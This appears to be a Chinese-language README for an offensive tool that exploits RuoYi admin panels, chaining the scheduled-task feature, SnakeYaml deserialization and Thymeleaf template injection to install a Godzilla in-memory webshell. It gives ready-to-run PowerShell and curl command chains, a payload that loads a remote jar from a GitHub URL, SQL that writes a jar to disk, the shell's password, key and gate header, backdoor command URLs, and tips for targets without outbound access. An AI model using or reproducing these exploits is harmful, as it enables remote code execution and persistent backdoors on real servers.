# ruoyi-gzms

RuoYi 定时任务链 → SnakeYaml 反序列化 → 哥斯拉内存马 一键工具。

## 内容

| 路径 | 说明 |
|---|---|
| `ruoyi-gzms.jar` | 一键 CLI：登录 → 三阶段链 → 回显验证 → 自动现场恢复 → 打印连接块 |
| `chain_inject.sh` | 备用：手动三阶段链脚本 |

## 载荷 jar（目标机从这里拉）

```
https://raw.githubusercontent.com/tiaodan577-glitch/ry-gz-payload/main/g.jar
```

- pass: `pass`
- key: `3c6e0b8a9c15224a`
- 内存马 URL: `/login?cmd=1`（带 `cmd` 参数的任意路径）
- 门禁头: `X-Cmd-Ruoyi: 1`
- 回显后门: `GET /login?cmd=<命令>`；卸马: `GET /login?cmd=delete`

> ⚠️ 载荷 URL 必须**从目标机可达且稳定**。raw.githubusercontent.com 会抖/被墙，且目标 JVM 拉取挂起时会占满 quartz 线程池导致任务触发排队数分钟。实战建议 `--jar-url` 指自建镜像（VPS/对象存储）。

## CLI 用法

```bash
# 凭证模式
java -jar ruoyi-gzms.jar --url http://target:8080 --user admin --pass admin123
# cookie 模式（有验证码的目标）
java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
# 选项
#   --jar-url URL   自建载荷镜像（默认上面的 GitHub raw 地址）
#   --jndi URL      JNDI 远程加载投递（自建 JYso/ysomap 服务，实测 RCE）
#   --gz-pass P --gz-key K   载荷 jar 里的哥斯拉 pass/key
#   --proxy host:port
#   --no-cleanup    保留临时任务和被改写的 job1
```

## SSTI 链模式（第二条独立 RCE，实测进马）

`--mode ssti` 走 Thymeleaf SSTI（CacheController `fragment` 注入），与定时任务链完全独立、互为备份。投递三选一：

```bash
# 1) 远程/本地/UNC jar 加载
java -jar ruoyi-gzms.jar --url http://target:8080 --user U --pass P --mode ssti --jar-url http://内网IP/g.jar
java -jar ruoyi-gzms.jar ... --mode ssti --jar-url "file:/path/g.jar"        # 本地文件（已落盘）
java -jar ruoyi-gzms.jar ... --mode ssti --jar-url "\\\\host\\share\\g.jar"  # Windows UNC/内网SMB
# 2) 纯内存（零文件零网络，类字节 base64 内嵌 + 反射 defineClass）
java -jar ruoyi-gzms.jar ... --mode ssti --inline --jar-url http://镜像/g.jar   # 从jar提取类，无需目标落盘
# 3) SQL 落盘再本地加载（站库同机）
java -jar ruoyi-gzms.jar ... --mode ssti --jar-url http://镜像/g.jar --drop-to /var/lib/mysql-files/g.jar
#   --load-path PATH  落盘后实际加载路径（默认=drop-to；docker/站库分离实验用）
```

要求目标账号有 `monitor:cache:view` 权限（admin 默认有）。机制、字符禁区、坑位见技能库 `references/ssti-chain.md`。

## 部署/OS 适配矩阵（实测结论）

| 场景 | job 链 | ssti + jar加载(http/file/UNC) | ssti `--inline` | ssti `--drop-to` | ssti `--via-db` |
|---|---|---|---|---|---|
| 站库一体 Linux | ✅ | ✅ | ✅ | ✅（secure_file_priv 空→/tmp；默认锁目录则需 app 可读） | ✅ |
| 站库一体 Windows | ✅ | ✅ | ✅ | ✅（Windows MySQL secure_file_priv 多为空 → `C:/...`） | ✅ |
| 站库分离（任意 OS） | ✅ | ✅ | ✅ | ❌ 文件落 DB 机盘，web 机读不到 | ✅ **字节走 JDBC，绕开文件系统** |
| Windows + 内网未授权 SMB | ✅ | ✅ UNC 直拉 `\\\\host\\share\\g.jar`（走系统 SMB） | ✅ | — | ✅ |
| Linux 无出网无共享 | ✅（file: 已落盘路径） | ✅ file: | ✅ | 视同机条件 | ✅ |

`--via-db` 原理：直连 createTable CTAS 把**工厂类字节**（非整个 jar）hex 存进临时表 → SSTI 的 JS 经 `SpringUtils.getBean(DataSource)` 走 JDBC `SELECT b FROM 表` 拉回 → 反射 defineClass → 进马。web↔DB 本来就通 JDBC，站库分离零影响。实测：docker 站库分离环境全链进马 ✓。

通用注意事项：
- **JDK 8-14**（SSTI 链依赖 Nashorn `js` 引擎；JDK 15+ 移除了 Nashorn，`--mode ssti` 不可用，job 链不受影响）。RuoYi 4.7.5 常规部署就是 JDK8
- Windows 路径/盘符/UNC 反斜杠已在工具内转义处理；路径含双引号会被拒（罕见）
- **CLI 默认忽略 TLS 证书错误**（自签/代理 MITM 全放行），https 目标直接打
- cookie 过期/无效：三条路径（job、ssti、sql）都会报 `session invalid/expired — re-login or refresh --cookie`
- 换 `--gz-pass/--gz-key` 需重打载荷 jar（xc=md5(key)[0:16] 派生）；`--inline` 自动从 jar 提类，重打后照常

要求 JRE 8+，无其他依赖。Windows 同样：`java -jar ruoyi-gzms.jar --url ... --user ... --pass ...`。

## Windows curl 快速验证

cmd 里最快验证内存马（匿名路径，无需登录）：

```bat
curl.exe -s "http://target:8080/login?cmd=whoami"
curl.exe -s "http://target:8080/login?cmd=ipconfig"
```

cmd 取 cookie / 打点：

```bat
curl.exe -s -c cookies.txt -d "username=admin&password=admin123&rememberMe=false" http://target:8080/login
curl.exe -s -b cookies.txt -X POST "http://target:8080/monitor/job/list?pageNum=1&pageSize=10"
```

完整三阶段链（**PowerShell** 里跑——payload 含单双引号，cmd 传参会截断，PowerShell 才能正确传给 curl.exe）：

```powershell
# 0) 登录取 cookie
curl.exe -s -c cookies.txt -d "username=admin&password=admin123&rememberMe=false" http://target:8080/login

# 1) 生成 hex payload（hex 后只剩 0-9a-f，一次绕过 6 道控制器校验）
$p = 'org.yaml.snakeyaml.Yaml.load(''!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/tiaodan577-glitch/ry-gz-payload/main/g.jar"]]]]'')'
$hex = '0x' + (([Text.Encoding]::UTF8.GetBytes($p) | ForEach-Object { '{0:x2}' -f $_ }) -join '')
$inv = "genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = $hex WHERE job_id = 1')"

# 2) Stage1：建任务（invokeTarget 超 varchar(500) 会截断，URL 要短）
curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/add --data-urlencode "jobName=gzms1" --data-urlencode "jobGroup=DEFAULT" --data-urlencode "invokeTarget=$inv" --data-urlencode "cronExpression=0 0 0 1 1 ?" --data-urlencode "misfirePolicy=0" --data-urlencode "concurrent=1" --data-urlencode "status=1"

# 3) 从 job/list 返回里拿 gzms1 的 jobId，然后：
curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/run -d "jobId=<临时任务ID>"   # Stage2 篡改 job1
curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/run -d "jobId=1"              # Stage3 触发
curl.exe -s "http://target:8080/login?cmd=whoami"                                               # 验证回显
```

注意：开验证码的目标用 `--cookie` 模式（浏览器登录后贴 JSESSIONID）。CLI **默认忽略 TLS 证书**（自签/代理 MITM 均放行）；curl 打 https 目标记得加 `-k`。

## gzcli 连接

```bash
./gzcli add --url "http://target:8080/login?cmd=1" --password pass --key 3c6e0b8a9c15224a \
  --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --group /lab --remark ruoyi-gzms
# 必须补门禁头（char(13,10) 才是真 CRLF）：
sqlite3 dist/data.db "UPDATE shell SET headers='X-Cmd-Ruoyi: 1'||char(13,10)||'Accept: */*'||char(13,10)||'Connection: close'||char(13,10) WHERE id='<uuid>';"
# macOS 跑 GodzillaCli 不要带 -Djava.awt.headless=true，cwd 在 dist/
# 顺序必须 add → sqlite 补头 → test/exec（乱序首测会报 HeadlessException 噪音）
java -Dfile.encoding=UTF-8 -cp "godzilla-cli.jar:Godzilla2-rebuilt.jar" shells.cli.GodzillaCli test --id <uuid>
```

注意：Godzilla2 的 AES key 是 `md5(secretKey)[0:16]` 派生值；换 pass/key 需重打载荷 jar。

## 不出网打法（实测）

解析器硬约束：invoke_target 参数内**禁止右括号 `)`**（`substringBetween` 首个 `)` 截断），逗号在引号内安全。

1. **内网跳板（首选）**：载荷 jar/JNDI 放目标可达的内网资产，`--jar-url http://内网IP/g.jar` / `--jndi ldap://内网IP:1389/...`
2. **SQL 落盘 + file:// 离线加载**（站库同机）：无右括号 SQL 分块写文件再离线加载，全程零网络：
   ```sql
   CREATE TABLE IF NOT EXISTS g SELECT 1 AS i, 0x<块1hex> AS b
   INSERT INTO g SET i=2, b=0x<块2hex>
   SELECT b INTO DUMPFILE '/path/g.jar' FROM g ORDER BY i   -- 按序原样拼接
   ```
   然后 `--jar-url "file:/path/g.jar"`（已实测进马）。限制：FILE 权限、secure_file_priv、落盘 640 权限需应用可读；站库分离无效
3. **落盘 Spring XML**（命令执行小文件）：ProcessBuilder bean + init-method，Yaml `FileSystemXmlApplicationContext` 构造即执行（全文无右括号）
